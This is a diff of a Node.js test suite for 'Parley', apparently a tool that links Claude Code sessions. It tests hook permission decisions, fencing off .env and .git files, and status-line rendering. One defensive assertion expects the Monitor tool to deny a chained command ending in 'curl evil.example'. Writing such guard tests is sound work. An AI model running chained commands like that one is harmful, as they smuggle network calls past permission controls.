@@ -3,7 +3,9 @@ import assert from "node:assert/strict";
 import { join } from "node:path";
 import { realpathSync, mkdirSync } from "node:fs";
 import { handleHook } from "../src/hooks.js";
+import { glyphSets, pickGlyphs } from "../src/ui.js";
 import {
+  appendLog,
   bindProject,
   createIdentity,
   newRoom,
@@ -14,13 +16,26 @@ import {
   readLaunch,
   readSession,
   recordWake,
+  updateLaunch,
   updateSession,
 } from "../src/sessions.js";
-import { checkArgs, claudeArgs, launchFiles, rulePath } from "../src/launch.js";
+import {
+  checkArgs,
+  checkFolder,
+  claudeArgs,
+  launchFiles,
+  ownStatusLine,
+  rulePath,
+  watchCommand,
+} from "../src/launch.js";
+import { parleyRow, statusLine, watchState } from "../src/statusline.js";
 import { ParleyServer } from "../src/mcp.js";
-import { tempHome } from "./helpers.js";
+import { tempHome, write } from "./helpers.js";
+import { writeConfig } from "../src/config.js";
 
 const SID = "11111111-aaaa";
+const LAUNCH = "launch-1234";
+const WATCH = watchCommand("/n/node", "/p/cli.js", LAUNCH);
 
 function setup(t, { room = true } = {}) {
   const { home, paths } = tempHome(t);
@@ -28,6 +43,7 @@ function setup(t, { room = true } = {}) {
   const project = join(home, "project");
   mkdirSync(join(project, "src"), { recursive: true });
   const root = realpathSync.native(project);
+  let roomId = null;
   if (room) {
     const r = newRoom({
       secret: newRoomSecret(),
@@ -37,7 +53,13 @@ function setup(t, { room = true } = {}) {
     });
     saveRoom(paths, r);
     bindProject(paths, root, r.roomId);
+    roomId = r.roomId;
   }
+  // What the launcher and the server put in the launch file.
+  updateLaunch(paths, LAUNCH, (l) => {
+    l.watchCommand = WATCH;
+    l.status = { watching: false };
+  });
   const hook = (event, input = {}, now = Date.now()) =>
     handleHook(
       event,
@@ -47,105 +69,203 @@ function setup(t, { room = true } = {}) {
         permission_mode: "default",
         ...input,
       },
-      { paths, launchId: "launch-1234", now },
+      { paths, launchId: LAUNCH, now },
     );
-  return { paths, root, hook };
+  return { home, paths, root, roomId, hook };
 }
 
-test("a fresh conversation is off, with a hint when the folder has a room", (t) => {
+test("a parley session is on from the start: context for the model", (t) => {
   const { paths, hook } = setup(t);
   const out = hook("session-start", { source: "startup" });
-  assert.match(out.systemMessage, /room "shop".*parley on/);
-  assert.equal(readSession(paths, SID).enabled, false);
-  assert.equal(readLaunch(paths, "launch-1234").sessionId, SID);
-});
-
-test("parley on and off are the person's own prompts, blocked before the model", (t) => {
-  const { paths, hook } = setup(t);
-  const on = hook("user-prompt", { prompt: "  Parley on " });
-  assert.equal(on.decision, "block");
-  assert.equal(on.hookSpecificOutput.suppressOriginalPrompt, true);
-  assert.equal(readSession(paths, SID).enabled, true);
-  // On survives a resume: the session id is the same.
-  const resumed = hook("session-start", { source: "resume" });
-  assert.match(resumed.hookSpecificOutput.additionalContext, /Parley is on/);
-  hook("user-prompt", { prompt: "parley off" });
-  assert.equal(readSession(paths, SID).enabled, false);
-  // Mentioning Parley in a sentence is just a prompt.
-  assert.equal(
-    hook("user-prompt", { prompt: "should we turn parley on later?" }),
-    null,
+  assert.match(out.hookSpecificOutput.additionalContext, /Parley is on/);
+  assert.equal(out.systemMessage, undefined);
+  assert.equal(readLaunch(paths, LAUNCH).sessionId, SID);
+  // Resumed or not, it is the same: on.
+  assert.match(
+    hook("session-start", { source: "resume" }).hookSpecificOutput
+      .additionalContext,
+    /Parley is on/,
   );
 });
 
-test("Parley will not turn on while permissions are bypassed", (t) => {
-  const { paths, hook } = setup(t);
-  const out = hook("user-prompt", {
-    prompt: "parley on",
-    permission_mode: "bypassPermissions",
-  });
-  assert.match(out.reason, /bypassed/);
-  assert.notEqual(readSession(paths, SID)?.enabled, true);
-});
-
-test("without a room, parley on explains how to get one", (t) => {
+test("without a room, the person is told how to get one", (t) => {
   const { hook } = setup(t, { room: false });
   assert.match(
-    hook("user-prompt", { prompt: "parley on" }).reason,
+    hook("session-start", { source: "startup" }).systemMessage,
     /parley create/,
   );
-  assert.equal(hook("session-start", { source: "startup" }), null);
+  assert.equal(hook("session-start", { source: "resume" }), null);
 });
 
-test("Parley's tools are refused while it is off", (t) => {
+test("the model is reminded to arm the watch until it is armed", (t) => {
+  const { paths, roomId, hook } = setup(t);
+  for (const id of ["m1", "m2"])
+    appendLog(paths, roomId, {
+      id,
+      at: Date.now(),
+      kind: "message",
+      text: "hi",
+    });
+  const out = hook("user-prompt", { prompt: "fix the cart" });
+  const context = out.hookSpecificOutput.additionalContext;
+  assert.ok(context.includes(WATCH));
+  assert.match(context, /2 Parley messages are waiting/);
+  assert.ok(readSession(paths, SID).humanAt);
+  updateLaunch(paths, LAUNCH, (l) => (l.status = { watching: true }));
+  assert.equal(hook("user-prompt", { prompt: "and the tests" }), null);
+});
+
+test("Parley's tools need no prompt, and are refused in bypass mode", (t) => {
   const { hook } = setup(t);
-  const out = hook("pre-tool-use", { tool_name: "mcp__parley__send" });
-  assert.equal(out.hookSpecificOutput.permissionDecision, "deny");
-  hook("user-prompt", { prompt: "parley on" });
-  assert.equal(hook("pre-tool-use", { tool_name: "mcp__parley__send" }), null);
-  const bypass = hook("pre-tool-use", {
-    tool_name: "mcp__parley__send",
-    permission_mode: "bypassPermissions",
-  });
-  assert.equal(bypass.hookSpecificOutput.permissionDecision, "deny");
+  const decision = (input) =>
+    hook("pre-tool-use", input)?.hookSpecificOutput?.permissionDecision ?? null;
+  assert.equal(decision({ tool_name: "mcp__parley__send" }), "allow");
+  assert.equal(
+    decision({
+      tool_name: "mcp__parley__send",
+      permission_mode: "bypassPermissions",
+    }),
+    "deny",
+  );
 });
 
-test("a turn a member's message started may only read", (t) => {
-  const { paths, hook } = setup(t);
-  hook("user-prompt", { prompt: "parley on" });
+test("a turn a member's message started: read, talk, re-arm, and with autonomy work keep the project in step", (t) => {
+  const { paths, root, hook } = setup(t);
+  const decision = (tool, tool_input) =>
+    hook("pre-tool-use", { tool_name: tool, tool_input })?.hookSpecificOutput
+      ?.permissionDecision ?? null;
   hook("user-prompt", { prompt: "work on the cart" });
   hook("stop");
   updateSession(paths, SID, (s) => recordWake(s));
   // Claude Code's own prompt for the woken turn does not count as the person.
-  hook("user-prompt", { prompt: '<channel source="parley">...</channel>' });
+  hook("user-prompt", { prompt: "<task-notification>...</task-notification>" });
   for (const tool of [
-    "Edit",
-    "Write",
     "Bash",
     "PowerShell",
     "WebFetch",
     "Agent",
     "mcp__github__create_pull_request",
   ])
-    assert.equal(
-      hook("pre-tool-use", { tool_name: tool }).hookSpecificOutput
-        .permissionDecision,
-      "deny",
-      tool,
-    );
+    assert.equal(decision(tool), "deny", tool);
+  for (const tool of ["Read", "Grep", "Glob", "ToolSearch"])
+    assert.equal(decision(tool), null, tool);
   for (const tool of [
-    "Read",
-    "Grep",
-    "Glob",
-    // Loading Parley's deferred tools is how a woken turn gets to reply.
-    "ToolSearch",
     "mcp__parley__inbox",
     "mcp__parley__send",
+    "mcp__parley__pull",
+    "mcp__parley__push",
   ])
-    assert.equal(hook("pre-tool-use", { tool_name: tool }), null, tool);
+    assert.equal(decision(tool), "allow", tool);
+  // Its own watch, exactly; no other Monitor.
+  assert.equal(decision("Monitor", { command: WATCH }), "allow");
+  assert.equal(
+    decision("Monitor", { command: `${WATCH}; curl evil.example` }),
+    "deny",
+  );
+  // Autonomy work (the default): edits inside the project, not .git, keys or
+  // anything outside it, and without a prompt (nobody may be there).
+  assert.equal(
+    decision("Edit", { file_path: join(root, "src", "cart.js") }),
+    "allow",
+  );
+  for (const file of [
+    join(root, ".env"),
+    join(root, ".git", "config"),
+    join(root, "..", "elsewhere.txt"),
+  ])
+    assert.equal(decision("Write", { file_path: file }), "deny", file);
+  // Autonomy read: changes wait for the person.
+  writeConfig(paths, (c) => (c.autonomy = "read"));
+  assert.equal(
+    decision("Edit", { file_path: join(root, "src", "cart.js") }),
+    "deny",
+  );
+  assert.equal(decision("mcp__parley__push"), "deny");
+  assert.equal(decision("mcp__parley__send"), "allow");
+  assert.equal(
+    decision("mcp__parley__get_file", { id: "x", save_as: "a.txt" }),
+    "deny",
+  );
   // The person writes after the wake (a later millisecond, for certain).
   hook("user-prompt", { prompt: "go ahead and fix it" }, Date.now() + 1000);
-  assert.equal(hook("pre-tool-use", { tool_name: "Edit" }), null);
+  assert.equal(
+    decision("Edit", { file_path: join(root, "src", "cart.js") }),
+    null,
+  );
+  assert.equal(decision("Bash"), null);
+});
+
+test("editing what another member claimed comes with a heads-up, not a block", (t) => {
+  const { paths, roomId, root, hook } = setup(t);
+  appendLog(paths, roomId, {
+    id: "claim-1",
+    at: Date.now(),
+    keptAt: Date.now(),
+    from: "someone-else",
+    name: "Jo",
+    kind: "claim",
+    paths: ["src/cart"],
+    until: Date.now() + 60_000,
+    note: "checkout refactor",
+  });
+  const out = hook("pre-tool-use", {
+    tool_name: "Edit",
+    tool_input: { file_path: join(root, "src", "cart", "index.js") },
+  });
+  assert.equal(out.hookSpecificOutput.permissionDecision, undefined);
+  assert.match(
+    out.hookSpecificOutput.additionalContext,
+    /Jo is working on src\/cart until .*checkout refactor/,
+  );
+  assert.equal(
+    hook("pre-tool-use", {
+      tool_name: "Edit",
+      tool_input: { file_path: join(root, "README.md") },
+    }),
+    null,
+  );
+});
+
+test("what is sent and received shows once, as lines for the person", (t) => {
+  const { paths, roomId, hook } = setup(t);
+  updateLaunch(paths, LAUNCH, (l) => (l.started = Date.now() - 1000));
+  const now = Date.now();
+  appendLog(paths, roomId, {
+    id: "m-1",
+    at: now,
+    keptAt: now,
+    own: true,
+    kind: "message",
+    text: "pulling now",
+    name: "Alice",
+  });
+  appendLog(paths, roomId, {
+    id: "m-2",
+    at: now,
+    keptAt: now,
+    from: "jo",
+    name: "Jo",
+    kind: "message",
+    text: "thanks!",
+  });
+  appendLog(paths, roomId, {
+    id: "m-3",
+    at: now,
+    keptAt: now,
+    from: "jo",
+    name: "Jo",
+    kind: "note",
+    topic: "release",
+    text: "tag on Fridays",
+  });
+  const out = hook("stop", { stop_hook_active: true });
+  const g = glyphSets[pickGlyphs()];
+  assert.deepEqual(out.systemMessage.split("\n"), [
+    `${g.mark} Parley ${g.sent} the room: pulling now`,
+    `${g.mark} Parley ${g.got} Jo: thanks!`,
+    `${g.mark} Parley ${g.got} Jo remembered "release": tag on Fridays`,
+  ]);
+  assert.equal(hook("post-tool-use", { tool_name: "mcp__parley__send" }), null);
 });
 
 test("hooks never throw on odd input", (t) => {
@@ -191,11 +311,11 @@ test("the launcher refuses bypass and print mode", () => {
   );
 });
 
-test("a launch's settings run hooks without a shell and fence off ~/.parley", (t) => {
+test("a launch: hooks without a shell, a status line, the watch allowed, ~/.parley fenced off", (t) => {
   const { paths } = setup(t);
   const files = launchFiles({
     paths,
-    launchId: "launch-1234",
+    launchId: LAUNCH,
     nodePath: "C:\\node\\node.exe",
     cliPath: "C:\\parley\\src\\cli.js",
   });
@@ -203,15 +323,17 @@ test("a launch's settings run hooks without a shell and fence off ~/.parley", (t
   assert.deepEqual(handler, {
     type: "command",
     command: "C:/node/node.exe",
-    args: [
-      "C:/parley/src/cli.js",
-      "hook",
-      "pre-tool-use",
-      "--launch",
-      "launch-1234",
-    ],
+    args: ["C:/parley/src/cli.js", "hook", "pre-tool-use", "--launch", LAUNCH],
     timeout: 10,
   });
+  assert.equal(
+    files.settings.statusLine.command,
+    `C:/node/node.exe "C:/parley/src/cli.js" statusline --launch ${LAUNCH}`,
+  );
+  assert.equal(files.settings.statusLine.refreshInterval, 5);
+  assert.deepEqual(files.settings.permissions.allow, [
+    `Bash(C:/node/node.exe "C:/parley/src/cli.js" watch --launch ${LAUNCH})`,
+  ]);
   // Only rule kinds Claude Code matches: Edit covers Write.
   assert.deepEqual(
     files.settings.permissions.deny.map((rule) => rule.replace(/\(.*/, "")),
@@ -226,8 +348,101 @@ test("a launch's settings run hooks without a shell and fence off ~/.parley", (t
     "C:/parley/src/cli.js",
     "mcp",
     "--launch",
-    "launch-1234",
+    LAUNCH,
   ]);
+  // No prompt of the person's own: Claude is first asked to arm the watch.
+  const args = claudeArgs(files, ["--resume"]);
+  assert.match(
+    args[0],
+    /^Parley is on in this session\. Before anything else, arm/,
+  );
+  assert.ok(args[0].includes(files.watch));
+  assert.deepEqual(args.slice(1), [
+    "--resume",
+    "--settings",
+    files.settingsFile,
+    "--mcp-config",
+    files.mcpFile,
+  ]);
+  // A prompt of their own stays first, and is not read as an MCP config.
+  assert.deepEqual(claudeArgs(files, ["--model", "opus", "fix the tests"]), [
+    "--model",
+    "opus",
+    "fix the tests",
+    "--settings",
+    files.settingsFile,
+    "--mcp-config",
+    files.mcpFile,
+  ]);
+  // A node path with spaces cannot start a PowerShell command.
+  assert.match(
+    watchCommand("C:/Program Files/nodejs/node.exe", "/p/cli.js", "x"),
+    /^node "/,
+  );
+});
+
+test("the person's own status line is found where Claude Code would find it", (t) => {
+  const { home, root } = setup(t);
+  const env = { CLAUDE_CONFIG_DIR: join(home, ".claude") };
+  assert.equal(ownStatusLine({ cwd: root, env, home }), null);
+  write(join(home, ".claude", "settings.json"), {
+    statusLine: { type: "command", command: "user-line" },
+  });
+  assert.equal(ownStatusLine({ cwd: root, env, home }).command, "user-line");
+  write(join(root, ".claude", "settings.json"), {
+    statusLine: { type: "command", command: "project-line" },
+  });
+  write(join(root, ".claude", "settings.local.json"), {
+    statusLine: { type: "command", command: "local-line" },
+  });
+  assert.equal(ownStatusLine({ cwd: root, env, home }).command, "local-line");
+});
+
+test("Parley's row says what matters and fits the terminal", () => {
+  const env = { NO_COLOR: "1" };
+  const status = {
+    room: "shop",
+    members: [{ name: "Alex", state: "idle" }],
+    relay: "connected",
+    watching: true,
+    unread: 2,
+    pending: 0,
+    notices: 0,
+    blocked: null,
+  };
+  assert.equal(
+    parleyRow(status, { env }),
+    "\u21c4 parley \u00b7 shop \u00b7 \u25cf live \u00b7 2 new \u00b7 1/1 online",
+  );
+  assert.equal(
+    parleyRow(status, { env: { ...env, PARLEY_GLYPHS: "plain" }, columns: 28 }),
+    "<> parley - shop - * live",
+  );
+  assert.match(
+    parleyRow({ ...status, watching: false }, { env }),
+    /watch not armed/,
+  );
+  assert.match(
+    parleyRow({ ...status, blocked: "other repository" }, { env }),
+    /different repository, paused/,
+  );
+  assert.match(parleyRow(null, { env }), /starting/);
+});
+
+test("the status line keeps the person's own line exactly, with Parley's row under it", () => {
+  const env = { ...process.env, NO_COLOR: "1", COLUMNS: "120" };
+  const launch = {
+    ownStatusLine: { command: "echo their-line" },
+    status: { room: "shop", relay: "connected", watching: true, members: [] },
+  };
+  const out = statusLine({ launch, stdinText: "{}", env });
+  const [theirs, ours] = out.trimEnd().split("\n");
+  assert.equal(theirs, "their-line");
+  assert.match(ours, /parley \u00b7 shop \u00b7 \u25cf live/);
+  assert.match(
+    statusLine({ launch: { status: null }, stdinText: "{}", env }),
+    /^\u21c4 parley/,
+  );
 });
 
 test("permission rule paths use Claude Code's forms", () => {
@@ -238,70 +453,93 @@ test("permission rule paths use Claude Code's forms", () => {
   else assert.equal(rulePath("/srv/.parley", home), "//srv/.parley");
 });
 
-test("the /parley command toggles like the plain prompt", (t) => {
+test("a turn does not end with the watch down, but gets time to connect", (t) => {
   const { paths, hook } = setup(t);
-  assert.equal(hook("user-prompt", { prompt: "/parley on" }).decision, "block");
-  assert.equal(readSession(paths, SID).enabled, true);
-  assert.match(
-    hook("user-prompt", { prompt: "/parley:parley status" }).reason,
-    /Parley is on/,
+  hook("session-start", { source: "startup" });
+  const blocked = hook("stop", {});
+  assert.equal(blocked.decision, "block");
+  assert.ok(blocked.reason.includes(WATCH));
+  // Already continued for this stop once: let it end.
+  assert.equal(hook("stop", { stop_hook_active: true }), null);
+  // Claude just started the watch: no need to ask again.
+  hook("pre-tool-use", {
+    tool_name: "Monitor",
+    tool_input: { command: WATCH },
+  });
+  assert.ok(readLaunch(paths, LAUNCH).armingAt);
+  assert.equal(hook("stop", {}), null);
+  // Armed: nothing to ask.
+  updateLaunch(paths, LAUNCH, (l) => {
+    l.armingAt = 0;
+    l.status = { watching: true };
+  });
+  assert.equal(hook("stop", {}), null);
+  // Parley paused here (another repository): nothing to ask either.
+  updateLaunch(paths, LAUNCH, (l) => {
+    l.status = { watching: false, blocked: "other repository" };
+  });
+  assert.equal(hook("stop", {}), null);
+});
+
+test("the row says the watch is arming at first, and only later that it is down", () => {
+  const now = Date.now();
+  assert.equal(watchState({ status: { watching: true } }, now), "armed");
+  assert.equal(
+    watchState({ started: now - 10_000, status: {} }, now),
+    "arming",
   );
-  hook("user-prompt", { prompt: "/parley off" });
-  assert.equal(readSession(paths, SID).enabled, false);
+  assert.equal(
+    watchState(
+      { started: now - 600_000, armingAt: now - 3000, status: {} },
+      now,
+    ),
+    "arming",
+  );
+  assert.equal(watchState({ started: now - 600_000, status: {} }, now), "off");
+  const env = { NO_COLOR: "1" };
+  const status = { room: "shop", relay: "connected", watching: false };
+  assert.match(
+    parleyRow({ ...status, watchState: "arming" }, { env }),
+    /arming watch/,
+  );
+  assert.match(
+    parleyRow({ ...status, watchState: "off" }, { env }),
+    /watch not armed/,
+  );
 });
 
-test("a launch brings the /parley plugin, and the MCP server only before install", (t) => {
-  const { paths } = setup(t);
-  const before = launchFiles({
-    paths,
-    launchId: "launch-1234",
-    cliPath: "/p/cli.js",
-  });
-  const after = launchFiles({
-    paths,
-    launchId: "launch-1234",
-    cliPath: "/p/cli.js",
-    installed: true,
-  });
-  const argsBefore = claudeArgs(before, ["--resume"]);
-  const argsAfter = claudeArgs(after, ["--resume"]);
-  assert.ok(argsBefore.includes("--mcp-config"));
-  assert.ok(!argsAfter.includes("--mcp-config"));
-  for (const args of [argsBefore, argsAfter]) {
-    assert.equal(args[args.indexOf("--plugin-dir") + 1], before.pluginDir);
-    assert.deepEqual(
-      args.slice(-3),
-      [
-        "--dangerously-load-development-channels",
-        "server:parley",
-        "--resume",
-      ].slice(-3),
-    );
-  }
-  const command = Object.entries(after.pluginFiles).find(([file]) =>
-    file.endsWith("parley.md"),
-  )[1];
-  assert.match(command, /disable-model-invocation: true/);
+test("parley does not start where Parley has nothing to do", (t) => {
+  const { home, paths, root } = setup(t);
+  // In the room's folder (and below it): fine.
+  assert.equal(
+    checkFolder({ paths, cwd: join(root, "src") }).room.name,
+    "shop",
+  );
+  // Elsewhere: not in a room.
+  mkdirSync(join(home, "elsewhere"), { recursive: true });
+  assert.throws(
+    () => checkFolder({ paths, cwd: join(home, "elsewhere") }),
+    /not in a Parley room.*plain `claude`/,
+  );
+  // Not set up: no keys.
+  const bare = tempHome(t);
+  assert.throws(
+    () => checkFolder({ paths: bare.paths, cwd: root }),
+    /not set up/,
+  );
 });
 
-test("the installed MCP server is dormant outside a parley launch", async () => {
+test("every tool Parley lists has an implementation", async () => {
   const sent = [];
   const server = new ParleyServer({
     paths: null,
-    launchId: null,
+    launchId: "launch-1234",
     env: {},
     write: (m) => sent.push(m),
   });
-  await server.handle({
-    jsonrpc: "2.0",
-    id: 1,
-    method: "initialize",
-    params: { capabilities: {} },
-  });
-  await server.handle({ jsonrpc: "2.0", id: 2, method: "tools/list" });
-  server.handle({ jsonrpc: "2.0", method: "notifications/initialized" });
-  assert.deepEqual(sent[0].result.capabilities, {});
-  assert.equal(sent[0].result.instructions, undefined);
-  assert.deepEqual(sent[1].result.tools, []);
-  assert.equal(server.timer, undefined);
+  await server.handle({ jsonrpc: "2.0", id: 1, method: "tools/list" });
+  const tools = sent[0].result.tools.map((t) => t.name);
+  assert.ok(tools.length >= 18);
+  for (const name of tools)
+    assert.equal(typeof server[`tool_${name}`], "function", name);
 });
